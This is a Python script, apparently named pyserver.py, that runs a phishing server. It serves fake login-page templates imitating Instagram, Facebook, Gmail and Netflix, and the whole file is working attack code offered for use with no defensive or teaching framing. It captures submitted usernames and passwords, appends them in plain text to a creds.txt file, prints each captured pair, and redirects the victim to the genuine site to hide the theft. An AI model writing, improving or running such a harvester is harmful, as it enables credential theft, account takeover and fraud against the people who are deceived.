import os
import http.server
import socketserver
from urllib.parse import parse_qs
from pathlib import Path
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Constants
PORT = 9000
CREDS_FILE = Path(__file__).parent.parent / "creds.txt"
TEMPLATES_DIR = Path(__file__).parent / 'templates'

# Store template globally
current_template = None

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/submit':
            self.handle_form_submission()
        else:
            super().do_GET()

    def handle_form_submission(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 1024:
                self.send_error(413, "Payload too large")
                return

            post_data = self.rfile.read(content_length)
            parsed_data = parse_qs(post_data.decode('utf-8'))
            username = parsed_data.get('username', [''])[0]
            password = parsed_data.get('password', [''])[0]

            if not username or not password:
                self.send_error(400, "Username and password are required")
                return

            save_credentials(username, password, current_template)

            # Redirect based on template
            redirect_urls = {
                'instagram': 'https://instagram.com',
                'facebook': 'https://facebook.com',
                'gmail': 'https://mail.google.com',
                'netflix': 'https://netflix.com'
            }

            self.redirect_to(redirect_urls.get(current_template, 'https://google.com'))

        except Exception as e:
            print(Fore.RED + f"⚠️  Error handling POST request: {e}")
            self.send_error(500, "Internal server error")

    def redirect_to(self, url):
        self.send_response(302)
        self.send_header('Location', url)
        self.end_headers()

def save_credentials(username, password, template_name):
    try:
        CREDS_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(CREDS_FILE, "a", encoding='utf-8') as f:
            f.write(f"🛡️ {template_name} | 📛 {username} | 🔑 {password}\n")
        print(Fore.GREEN + f"\n[✔] Saved creds from {Fore.YELLOW}{template_name.upper()}: "
              f"{Fore.CYAN}📛 {username} {Fore.MAGENTA}| 🔑 {password}")
    except Exception as e:
        print(Fore.RED + f"💥 Error saving credentials: {e}")

def start_server(template_name):
    global current_template
    current_template = template_name.lower()

    template_dir = TEMPLATES_DIR / current_template
    if not template_dir.exists():
        print(Fore.RED + f"❌ Template '{current_template}' not found at {template_dir}")
        return

    os.chdir(template_dir)

    try:
        handler = MyHandler
        with socketserver.TCPServer(("", PORT), handler) as httpd:
            print(Fore.BLUE + f"\n🚀 Serving '{Fore.YELLOW}{current_template}{Fore.BLUE}' at {Fore.CYAN}http://localhost:{PORT}")
            print(Fore.GREEN + f"📂 Credentials will be saved to: {CREDS_FILE}")
            print(Fore.LIGHTBLACK_EX + "💡 Press CTRL+C to stop the server.\n")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print(Fore.RED + "\n🛑 Server stopped by user.")
    except Exception as e:
        print(Fore.RED + f"💥 Server error: {e}")

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        template = sys.argv[1]
        start_server(template)
    else:
        print(Fore.YELLOW + "⚙️  Usage: python3 pyserver.py <template_name>")
        print(Fore.YELLOW + "📌 Example: python3 pyserver.py instagram")
